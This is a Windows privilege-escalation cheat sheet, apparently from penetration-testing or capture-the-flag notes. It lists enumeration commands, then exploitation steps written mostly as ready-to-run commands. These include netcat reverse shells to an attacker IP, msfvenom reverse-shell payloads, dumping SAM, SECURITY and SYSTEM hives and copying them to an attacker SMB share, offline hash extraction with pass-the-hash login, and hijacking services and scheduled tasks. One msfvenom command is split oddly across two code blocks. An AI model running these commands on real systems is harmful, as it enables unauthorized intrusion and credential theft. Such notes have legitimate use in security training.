## Enumeration
### Get hostname of target machine
```cmd
hostname
```
### Get system information
```cmd
systeminfo
```
### View Windows updates and security patches
```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
### View installed programs and software
```cmd
wmic product get name,version,vendor
```
### View current user's privileges
```cmd
whoami /priv
```
### View current user's group membership
```cmd
whoami /groups
```
### Get user's information
```cmd
net user username
```
### Get all system users
```cmd
net users
```
```cmd
dir /b /ad "C:\\Users\\"
```
Windows XP and below
```cmd
dir /b /ad "C:\\Documents and Settings\\"
```
### View other logged in users
```cmd
qwinsta
```
### View status of active Windows services and drivers
```cmd
sc query
```
### View a Windows service configuration
```cmd
sc qc [APP NAME]
```
The associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter
### View environment variables
```powershell
Get-ChildItem Env: | ft Key,Value
```
### View terminal command history
```powershell
type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
```
```powershell
cat (Get-PSReadlineOption).HistorySavePath
```
### Check for AlwaysInstallElevated privileges
Value of `0x1` means AlwaysInstallElevated is enabled
```cmd
REG QUERY HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer
```
```cmd
REG QUERY HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
```
### Check for saved windows credentials
```cmd
cmdkey /list
```
### Check .NET Version
```cmd
REG QUERY "HKLM\\SOFTWARE\\Microsoft\\Net Framework Setup\\NDP"
```
### Check for IIS configuration
```cmd
type C:\\inetpub\\wwwroot\\web.config | findstr connectionString
```
```cmd
type C:\\Windows\\Microsoft.NET\\Framework64\\[VERSION]\\Config\\web.config | findstr connectionString
```
### Check for PuTTY credentials
```cmd
REG QUERY HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f "Proxy" /s
```
### Check for scheduled tasks
```cmd
schtasks /query /tn TASK_NAME /fo list /v
```
### Check scheduled tasks permissions
```cmd
icacls C:\\Tasks\\schtask.bat
```
### Check for running tasks
```cmd
tasklist /svc
```
### Look for specific task
```cmd
tasklist /svc /i TASK_NAME
```
### Using automated scripts
- [https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
## Exploitation
### Bypass PowerShell Execution Policy
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser
```
### Abuse SeImpersonatePrivilege
Download [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) to the target machine and run the following command. Only applicable in Windows 10 and Server 2016/2019.
```cmd
PrintSpoofer.exe -i -c cmd
```
For older versions such as Windows 2000/XP/Vista and Server 2003/2008. Download [Churrasco](https://github.com/Re4son/Churrasco) to target machine and run the following command.
```cmd
churrasco.exe "nc.exe 10.10.10.10 5555 -e cmd"
```
### Abuse AlwaysInstallElevated privilege
Generate reverse shell using `msfvenom`. Host the reverse shell and download it from the target machine
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 lport=4444 -f 
```
```cmd
msi -o reverse.msi
```
Execute the reverse shell by installing the malicious installer package. A netcat listener must be active on the attack machine.
```cmd
msiexec /quiet /qn /i C:\\Windows\\Temp\\reverse.msi
```
### Abuse SeBackup / SeRestore to dump SAM, SECURITY, and SYSTEM hashes
Get a copy of the SYSTEM, SECURITY and SAM hives and download them back to your machine
```cmd
REG SAVE HKLM\\SAM C:\\Temp\\sam.save
```
```cmd
REG SAVE HKLM\\SECURITY C:\\Temp\\security.save
```
```cmd
REG SAVE HKLM\\SYSTEM C:\\Temp\\system.save
```
Run a SMBServer and transfer files back to your machine
```bash
# Make sure you run `mkdir share` if the folder doesn't exists
impacket-smbserver -smb2support -username username -password password public share
```
Transfer copy of the SYSTEM, SECURITY and SAM hives to your machine
```cmd
# 10.10.10.10 is our (attacker) IP
copy C:\\Temp\\sam.save \\\\10.10.10.10\\public
```
```cmd
# 10.10.10.10 is our (attacker) IP
copy C:\\Temp\\security.save \\\\10.10.10.10\\public
```
```cmd
# 10.10.10.10 is our (attacker) IP
copy C:\\Temp\\system.save \\\\10.10.10.10\\public
```
Retrieve user password hashes
```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```
Login as the new elevated user
```bash
impacket-psexec -hashes [HASH] username@10.10.10.10
```
### Abuse SeTakeOwnership
```cmd
takeown /f C:\\inetpub\\wwwwroot\\web.config
```
```cmd
icacls C:\\inetpub\\wwwwroot\\web.config /grant attacker:F
```
### Abuse saved Windows credentials
```cmd
runas /savecred /user:[USERNAME] cmd.exe
```
### Abuse scheduled tasks write permissions
```cmd
echo C:\\Tools\\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\\Tasks\\schtask.bat
```
```cmd
# Force run the scheduled task
schtasks /run /tn [TASK NAME]
```
### Abuse insecure permission on Windows service executable
```cmd
C:\\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\\PROGRA~2\\SYSTEM~1\\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\\svcuser1
```
We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\\Progra~2\\System~1\\WService.exe`. We then proceed to check the permissions on the executable:
```cmd
C:\\Users\\thm-unpriv>icacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe
C:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\\SYSTEM:(I)(F)
                                  BUILTIN\\Administrators:(I)(F)
                                  BUILTIN\\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
Let's generate an exe-service payload using msfvenom, serve it through a python webserver, and download it to the target machine.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
### Abuse unquoted service paths
When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
```cmd
C:\\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\\svcusr2
```
When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

|Command|Argument 1|Argument 2|
|---|---|---|
|C:\MyPrograms\Disk.exe|Sorter|Enterprise\bin\disksrs.exe|
|C:\MyPrograms\Disk Sorter.exe|Enterprise\bin\disksrs.exe||
|C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe|||

This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be `C:\MyPrograms\Disk.exe` and take the rest as arguments.
Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:
1. First, search for `C:\MyPrograms\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\MyPrograms\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.
Let's generate an exe-service payload using msfvenom, serve it through a python webserver, and download it to the target machine.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
```cmd
C:\> move C:\Temp\rev-svc.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```
```cmd
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```
## Other Resources
- [https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
- [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md